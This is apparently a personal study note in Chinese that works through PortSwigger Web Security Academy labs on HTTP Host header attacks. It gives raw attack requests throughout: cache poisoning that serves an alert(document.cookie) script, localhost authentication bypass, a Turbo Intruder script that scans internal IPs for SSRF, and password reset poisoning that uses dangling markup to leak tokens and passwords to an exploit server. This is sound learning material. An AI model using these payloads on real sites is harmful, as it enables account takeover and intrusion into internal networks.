---
title: HTTP Host header attacks
description: HTTP Host header attacks
last_update:
  date: "2025-10-10T08:00:00+08:00"
---

## 前言

光是看標題就覺得超吸引我！

## 攻擊手法

### Port

```
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```

### Subdomain

```
GET /example HTTP/1.1
Host: notvulnerable-website.com
```

```
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```

### Double Host headers

```
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```

### Absolute URL in HTTP Request Start Line

```
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

### Indent

Tab

```
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```

Space

```
GET /example HTTP/1.1
 Host: bad-stuff-here
Host: vulnerable-website.com
```

### X-Forwarded-Host, X-Host, X-Forwarded-Server, X-HTTP-Host-Override, Forwarded

```
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here
```

補充，這在 [Web cache poisoning](./web-cache-poisoning.md) 的章節也有提到

## Lab: Web cache poisoning via ambiguous requests

| Dimension | Description                                                                                                            |
| --------- | ---------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/host-header/exploiting#web-cache-poisoning-via-the-host-header                    |
| Lab       | https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests |

先用 Burp Suite Repeater，觀察正常的 HTTP Request 跟 Response

Request

```
GET / HTTP/1.1
Host: 0a3600d3043f9f5f8071036c00c000d7.h1-web-security-academy.net
Cookie: session=CBkKLZ9HhcdYIHyStoQeEzZ0uXdNdFz4; _lab=46%7cMCwCFAavorc2RuuNk5TOoN4sBzoAPWOSAhQy6nke9VJs65Ko30mZecU7BWIvmBQGB7ZgklKnIGdWteyIGZrDrKJsBdgHZ2L6ztzw4oCs5bEaFGBGnuCnbFPPunxdwt%2fbaN%2bW4udri%2bmX7g6xstCi9wk6ZJKCB%2beLb6Zh78hWsYfchsPA%2fI8%3d
```

Response

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 10968
```

經過 [Web cache poisoning](./web-cache-poisoning.md) 的洗禮，現在知道 Request Headers 要帶 `Cookie`，Server 才不會回傳 `Set-Cookie`，導致 Response 無法被快取

嘗試加 [Port](#port)，`Host: 0a3600d3043f9f5f8071036c00c000d7.h1-web-security-academy.net:123`，看到

```html
<script
  type="text/javascript"
  src="//0a3600d3043f9f5f8071036c00c000d7.h1-web-security-academy.net:123/resources/js/tracking.js"
></script>
```

瀏覽器重整後．確實有 Cache Poisoning

先在 exploit-server 設定

```
/resources/js/tracking.js

HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8

alert(document.cookie)
```

但可惜換成數字以外就會 500 Internal Server Error

```html
<h4>Internal Server Error</h4>
<p class="is-warning">No host found</p>
```

嘗試第二招 [Double Host headers](#double-host-headers)

```
Host: 0a3600d3043f9f5f8071036c00c000d7.h1-web-security-academy.net
Host: exploit-0a03006204969f11807e027801e6005b.exploit-server.net
```

成功解題～

## Exploiting classic server-side vulnerabilities

https://portswigger.net/web-security/host-header/exploiting#exploiting-classic-server-side-vulnerabilities

```
For example, you should try the usual SQL injection probing techniques via the Host header. If the value of the header is passed into a SQL statement, this could be exploitable.
```

有點不直觀的黑箱 SQLi 測試 Entry Point，正常都是搜尋功能的參數，但還是先記在心裡～

## Lab: Host header authentication bypass

| Dimension | Description                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/host-header/exploiting#accessing-restricted-functionality    |
| Lab       | https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass |

直接用 Burp Suite Repeater 嘗試

```
GET / HTTP/2
Host: localhost
```

看到

```html
<a href="/admin">Admin panel</a>
```

接著就

```
GET /admin HTTP/2
Host: localhost
```

然後

```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
```

成功通關～

## Accessing internal websites with virtual host brute-forcing

https://portswigger.net/web-security/host-header/exploiting#accessing-internal-websites-with-virtual-host-brute-forcing

假設一台 Server 有 Host 一個 Public 網站 跟一個 Private 網站

```
www.example.com: 12.34.56.78
intranet.example.com: 10.0.0.132
```

如果攻擊者能夠知道 `intranet.example.com`，不管是透過

1. DNS Record
2. [Information disclosure](./information-disclosure.md)
3. subdomain brute-force

就能訪問 Server 內部的其他服務了，但這跟 [SSRF](./cross-site-requesy-forgery.md) 不一樣，SSRF 是 Client → Server → Other Server (outbound)

## Routing-based SSRF

https://portswigger.net/web-security/host-header/exploiting#routing-based-ssrf

假設有 Client `<=>` Reverse Proxy `<=>` Original Server 的架構

如果發送以下 HTTP Request 給 Reverse Proxy

```
GET / HTTP/1.1
Host: Other-Internal-Server
```

Reverse Proxy 真的把 HTTP Request 轉發到 Other-Internal-Server 的話，這樣就算是 Routing-based SSRF

## Lab: Routing-based SSRF

| Dimension | Description                                                                                    |
| --------- | ---------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/host-header/exploiting#routing-based-ssrf                 |
| Lab       | https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf |

這題雖然有說需要 Burp Collaborator，但實際上不用，所以免費仔也可以解這題

嘗試

```
GET / HTTP/2
Host: 192.168.0.253
```

得到

```
HTTP/2 421 Misdirected Request
Content-Length: 12

Invalid host
```

感覺怪怪的，嘗試把 Cookie 加回來

```
GET / HTTP/2
Host: 192.168.0.0
Cookie: session=DiGH5ChisnB86a0MOEKIeWDPXJ9Iudpa; _lab=47%7cMC0CFQCKiE2Z1joAO1TeS1%2bJPutrr4zU8AIUBRTLqSfRQaIEzyVXx8GuchfovEgnaJdnY6b%2f18L7DrcquE1bKPKItCFh3SrSo%2f2IsBklJJnIs5drq%2bWqp%2fMNsWuyQaA%2fAPVF6PXfEKE1ATRuau2CnPTeWa4%2f7r1Wfabo5f37H2xKDQ6B
```

得到

```
HTTP/2 504 Gateway Timeout
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 151

<html>
  <head>
    <title>Server Error: Gateway Timeout</title>
  </head>
  <body>
    <h1>Server Error: Gateway Timeout (3) connecting to 192.168.0.0</h1>
  </body>
</html>
```

這看起來就對了！之後用 Burp Suite Intruder 設定 0 ~ 255，成功在 157 的時候看到

```
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

訪問 `/admin`，得到

```html
<form
  style="margin-top: 1em"
  class="login-form"
  action="/admin/delete"
  method="POST"
>
  <input
    required
    type="hidden"
    name="csrf"
    value="GI5YIbc1fTgKkF8hsLGmRBXQXpn2AUht"
  />
  <label>Username</label>
  <input required type="text" name="username" />
  <button class="button" type="submit">Delete user</button>
</form>
```

構造

```
POST /admin/delete HTTP/2
Host: 192.168.0.157
Content-Type: application/x-www-form-urlencoded
Cookie: session=DiGH5ChisnB86a0MOEKIeWDPXJ9Iudpa; _lab=47%7cMC0CFQCKiE2Z1joAO1TeS1%2bJPutrr4zU8AIUBRTLqSfRQaIEzyVXx8GuchfovEgnaJdnY6b%2f18L7DrcquE1bKPKItCFh3SrSo%2f2IsBklJJnIs5drq%2bWqp%2fMNsWuyQaA%2fAPVF6PXfEKE1ATRuau2CnPTeWa4%2f7r1Wfabo5f37H2xKDQ6B
Content-Length: 53

username=carlos&csrf=GI5YIbc1fTgKkF8hsLGmRBXQXpn2AUht
```

成功解題～這題不知道為什麼 Cookie 必須留著

以後在改動的時候，建議都先改一個目標(Host)，其餘(HTTP Request Headers)保持不變，這樣才能準確地觀察到目標對於結果的影響

```
實驗組與對照組的關鍵差異在於只有一項操作變因（實驗處理）不同，而所有其他條件（控制變因）都必須相同，這樣才能準確地觀察到此項變因對實驗結果（應變變因）的影響。實驗組接受實驗處理，而對照組則不接受，或接受標準處理，以作為比較基準，驗證實驗的有效性。
```

## Lab: SSRF via flawed request parsing

| Dimension | Description                                                                                                 |
| --------- | ----------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/host-header/exploiting#routing-based-ssrf                              |
| Lab       | https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing |

嘗試

```
GET / HTTP/2
Host: 192.168.0.255
Cookie: session=sPlhrIq0lHijZYUywGUHFl7Cbq8XIKyx; _lab=46%7cMCwCFBHQGewuNsP%2fMKddSWju1t41ZAj3AhQbur78UPQJsPKv5lYdO0eKh%2brGDNVc6Hk4o6s6uKjukSzX7uBK8yimaGelBNxhPRc5y%2boK3EnlF8lbhg5xUlzYvQGu6VWWqpltHf9Qz0GEqrMbWt%2f4GlEax903VpA7GXYw0isJzRSDVGM%3d
```

得到

```
HTTP/2 403 Forbidden
Content-Type: text/html; charset=utf-8
Content-Length: 109

<html><head><title>Client Error: Forbidden</title></head><body><h1>Client Error: Forbidden</h1></body></html>
```

後來嘗試 Full URL

```
GET https://0adb005f03476ccc83440ae700e800f3.web-security-academy.net/ HTTP/2
Host: 192.168.0.255
Cookie: session=sPlhrIq0lHijZYUywGUHFl7Cbq8XIKyx; _lab=46%7cMCwCFBHQGewuNsP%2fMKddSWju1t41ZAj3AhQbur78UPQJsPKv5lYdO0eKh%2brGDNVc6Hk4o6s6uKjukSzX7uBK8yimaGelBNxhPRc5y%2boK3EnlF8lbhg5xUlzYvQGu6VWWqpltHf9Qz0GEqrMbWt%2f4GlEax903VpA7GXYw0isJzRSDVGM%3d
```

成功得到

```
HTTP/2 504 Gateway Timeout
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 153

<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (3) connecting to 192.168.0.255</h1></body></html>
```

之後就用 Burp Intruder 迴圈跑，成功在 52 的時候找到，接下來就跟上一題一樣的思路

```
POST https://0adb005f03476ccc83440ae700e800f3.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.52
Content-Type: application/x-www-form-urlencoded
Cookie: session=sPlhrIq0lHijZYUywGUHFl7Cbq8XIKyx; _lab=46%7cMCwCFBHQGewuNsP%2fMKddSWju1t41ZAj3AhQbur78UPQJsPKv5lYdO0eKh%2brGDNVc6Hk4o6s6uKjukSzX7uBK8yimaGelBNxhPRc5y%2boK3EnlF8lbhg5xUlzYvQGu6VWWqpltHf9Qz0GEqrMbWt%2f4GlEax903VpA7GXYw0isJzRSDVGM%3d
Content-Length: 53

username=carlos&csrf=yhtElho6i4chrQiFn6lyr30BaTBOMvbx
```

## Connection state attacks

這邊講到的就是 [Keep-Alive 和 Connection](../http/keep-alive-and-connection.md) 的機制，漏洞點是

```
Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection.
```

## Lab: Host validation bypass via connection state attack

| Dimension | Description                                                                                                                    |
| --------- | ------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/host-header/exploiting#connection-state-attacks                                           |
| Lab       | https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack |

這題剛好踩到我研究過的領域，所以解題沒難度，只是 Burp Intruder 似乎無法達到我想要的控制，所以我下載 Turbo Intruder 來用，結果要寫 Python Script！

總之，不管用啥工具，概念就是先送一個正常的 HTTP Request（記得要 `Connection: keep-alive`），之後在 Server 回傳的 `Keep-Alive: timeout=10` 秒之內，用同一條 TCP connection 去送 exploit HTTP Request（`Host: 192.168.0.x`）

```
GET / HTTP/1.1
Host: %s
Cookie: session=w0KPoHGC8dIA3RE6nNS8YTa2fyze1iDB; _lab=46%7cMCwCFEX3hqfXEGkXP2z%2fM4cFhL8Y3eDDAhRN4wIaILClMhwLkVyp9HLZSro1IV9nouJhDskqX7youwWiIoAtH3MCLhmX7rV8ksXy4e23KguNy2Usnnyd6rmF5YvG1bHQBFUpql6d7JJlDhN76UQcaGSZqDx3jgRimjhZRO3yTXd%2fnqAwOnk%3d
Connection: keep-alive
```

```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=257)

    # 第一個 request: innocent host
    engine.queue(target.req, '0a5000f103d4bc0c8377384000e8008e.h1-web-security-academy.net')

    # 接下來 256 個 requests: 內網 IPs
    for i in range(256):
        engine.queue(target.req, '192.168.0.{}'.format(i))

    engine.start()

def handleResponse(req, interesting):
    table.add(req)
```

好不容易成功跑起來後，我才發現題目有說 `To solve the lab, exploit this behavior to access an internal admin panel located at 192.168.0.1/admin`，所以根本不需要猜 0 ~ 255 這段，笑死

已知 `192.168.0.1` 的情況，其實直接用 Postman 也行，預設會 reuse keep-alive connection，接下來的解法就跟上面那題一樣了～

## SSRF via a malformed request line

https://portswigger.net/web-security/host-header/exploiting#ssrf-via-a-malformed-request-line

假設

```
GET /example HTTP/1.1
```

Reverse Proxy 會把它轉發到 `http://internal-backend/example`

那

```
GET @private-intranet/example HTTP/1.1
```

就會變成 `http://internal-backend@private-intranet/example`，其中 `internal-backend` 就變成 username，我們就可以控制 `private-intranet/example` 來訪問內網資源

## Lab: Basic password reset poisoning

| Dimension | Description                                                                                                                             |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning#how-to-construct-a-password-reset-poisoning-attack |
| Lab       | https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning     |

構造

```
POST /forgot-password HTTP/2
Host: exploit-0a81001603f64693810c84aa01ff0044.exploit-server.net
Cookie: session=kI0LhMB5RmuEWxjZMoIEcfP3b6UcO1Q7; _lab=46%7cMCwCFAKLBfATyYEJeLlSJ6aiBNzN5EwcAhR3uSOTdos0EPmk3yUgRmEUGMZ2X5xxBTkfbkKguH6Cy5%2fR30ivq4SM%2bLRGMJ7ZD8bc6tzat9FC%2bJVqLSway%2bV30C0Gcf9HeV1hP6y%2fSzwcPzYHsHvqVhQWBaZmMnxVtW7Cv4kXjZqsgO4%3d
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

username=carlos&csrf=HQHgq9K9G7JvzBKQFOG9NVrJqaxqxOzj
```

之後受害者會點擊 Email 的重設密碼連結，我們就可以在 exploit-server 的 log 看到

```
10.0.3.70       2025-10-09 10:57:55 +0000 "GET /forgot-password?temp-forgot-password-token=eltc9c54h6jvgqzj7u9pld3fzzgla5o4 HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

之後訪問 `/forgot-password?temp-forgot-password-token=eltc9c54h6jvgqzj7u9pld3fzzgla5o4` ，就可以成功更換密碼～

## Lab: Password reset poisoning via middleware

| Dimension | Description                                                                                                                             |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning#how-to-construct-a-password-reset-poisoning-attack |
| Lab       | https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware                        |

先嘗試跑一次忘記密碼的流程，看到

```html
<div
  style="word-break: break-all"
  class="dirty-body"
  data-dirty="&lt;p&gt;Hello!&lt;/p&gt;&lt;p&gt;Please &lt;a href='https://0abd001903edf4e78198d5a900a30008.web-security-academy.net/login'&gt;click here&lt;/a&gt; to login with your new password: fdl19nanDC&lt;/p&gt;&lt;p&gt;Thanks,&lt;br/&gt;Support team&lt;/p&gt;&lt;i&gt;This email has been scanned by the MacCarthy Email Security service&lt;/i&gt;"
>
  <p>Hello!</p>
  <p>
    Please
    <a
      href="https://0abd001903edf4e78198d5a900a30008.web-security-academy.net/login"
      >click here</a
    >
    to login with your new password: fdl19nanDC
  </p>
  <p>Thanks,<br />Support team</p>
  <i>This email has been scanned by the MacCarthy Email Security service</i>
</div>
```

嘗試重放忘記密碼的 HTTP Request，Host 注入雙引號

```
POST /forgot-password HTTP/2
Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net"
Cookie: _lab=45%7cMCsCFDVbI%2fJ78bImWKHhr%2b22Iz1mqhByAhNRucP%2ftREiChpaWXvBiKL2TtzHHSDBwJM3OdgSAGeFJtzwoBOkwPn9ITP95bYRCB%2bg%2b%2fJNdRjUAkjY4heZEJPP1j5E4KSwIKnPCScglNvjSl5iXXXmmCrZ7h%2fAj2oNuOkoxqiDVOSwtg%3d%3d; session=lAD5I7qARQpdqwVALm8KaUJk6sW9wSOZ
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=48aCyVz3zS9YWYYn6xIFQGbXu5XXidWg&username=wiener
```

結果

```
HTTP/2 504 Gateway Timeout
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 207

<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (3) connecting to 0abd001903edf4e78198d5a900a30008.web-security-academy.net&amp;quot;</h1></body></html>
```

嘗試用 [Port](#port)

```
POST /forgot-password HTTP/2
Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:"
Cookie: _lab=45%7cMCsCFDVbI%2fJ78bImWKHhr%2b22Iz1mqhByAhNRucP%2ftREiChpaWXvBiKL2TtzHHSDBwJM3OdgSAGeFJtzwoBOkwPn9ITP95bYRCB%2bg%2b%2fJNdRjUAkjY4heZEJPP1j5E4KSwIKnPCScglNvjSl5iXXXmmCrZ7h%2fAj2oNuOkoxqiDVOSwtg%3d%3d; session=lAD5I7qARQpdqwVALm8KaUJk6sW9wSOZ
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=48aCyVz3zS9YWYYn6xIFQGbXu5XXidWg&username=wiener
```

雙引號被 encode 之後塞進去了 `https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:&quot;/login`

嘗試單引號

```
POST /forgot-password HTTP/2
Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:'
Cookie: _lab=45%7cMCsCFDVbI%2fJ78bImWKHhr%2b22Iz1mqhByAhNRucP%2ftREiChpaWXvBiKL2TtzHHSDBwJM3OdgSAGeFJtzwoBOkwPn9ITP95bYRCB%2bg%2b%2fJNdRjUAkjY4heZEJPP1j5E4KSwIKnPCScglNvjSl5iXXXmmCrZ7h%2fAj2oNuOkoxqiDVOSwtg%3d%3d; session=lAD5I7qARQpdqwVALm8KaUJk6sW9wSOZ
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=48aCyVz3zS9YWYYn6xIFQGbXu5XXidWg&username=wiener
```

成功改變 HTML 結構

```html
<a href='https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:'/login'>
```

嘗試

```
Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:' data-hello='
```

得到

```html
<a
  href="https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:"
  data-hello="/login"
  >click here</a
>
```

嘗試 [Dangling markup](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) 的技巧

```
Host: 0abd001903edf4e78198d5a900a30008.web-security-academy.net:' ></a></p><a href="https://exploit-0a24003303edf426814dd45101c400eb.exploit-server.net
```

得到

```html
<div
  style="word-break: break-all"
  class="dirty-body"
  data-dirty="<p>Hello!</p><p>Please <a href='https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:' ></a></p><a href="https://exploit-0a24003303edf426814dd45101c400eb.exploit-server.net/login'>click here</a> to login with your new password: 6wQvim21lL</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>"
>
  <p>Hello!</p>
  <p>Please <a href="https://0abd001903edf4e78198d5a900a30008.web-security-academy.net:"></a></p>
</div>
```

看一下 exploit-server 的 log

```
10.0.3.244      2025-10-09 23:52:05 +0000 "GET /login'>click+here</a>+to+login+with+your+new+password:+6wQvim21lL</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i> HTTP/1.1" 404
```

成功提取到 Password，之後就把帳號換成受害者 `carlos`，成功通關～

## 小結

有先寫過 HTTP 30 篇文章，再來打這個 Lab，我感覺會輕鬆很多，但我還是從中有意識到自己沒補足的知識，例如 HTTP Request Target 是 absolute URL 還是 relative URL 的差別，之後可以再開一篇文章來補～

## 參考資料

- https://portswigger.net/web-security/host-header
